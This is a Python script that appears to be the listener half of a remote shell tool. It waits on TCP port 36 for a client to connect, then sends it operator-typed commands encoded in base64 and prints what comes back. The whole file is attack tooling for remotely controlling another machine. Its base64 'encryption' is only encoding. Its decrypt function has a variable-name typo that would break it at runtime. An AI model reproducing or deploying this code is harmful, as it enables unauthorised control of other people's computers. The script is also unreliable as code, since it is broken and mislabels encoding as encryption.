import socket
import subprocess
import sys
import time
import base64



HOST = socket.gethostbyname(socket.gethostname())
PORT = 36



def decrypt(command):
  decryped = base64.b64decode(command)
  return decrypted.decode()



def encrypt(command):
  encrypted = base64.b64encode(command.encode())
  return encrypted



def connect():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  s.bind((HOST, PORT))

  s.listen(1)

  print('[+] Listening For Client on Port 36')

  conn, addr = s.accept()

  print('[+] Client Active')

  while True:

    command = input('shell: ~ $ ')
    if 'terminate' in command:
      conn.send(b'terminate')
      conn.close()
      break

    else:
      command = encrypt(command)
      conn.send(command)
      print(decrypt(conn.recv(1024)))



def main():
  connect()



main()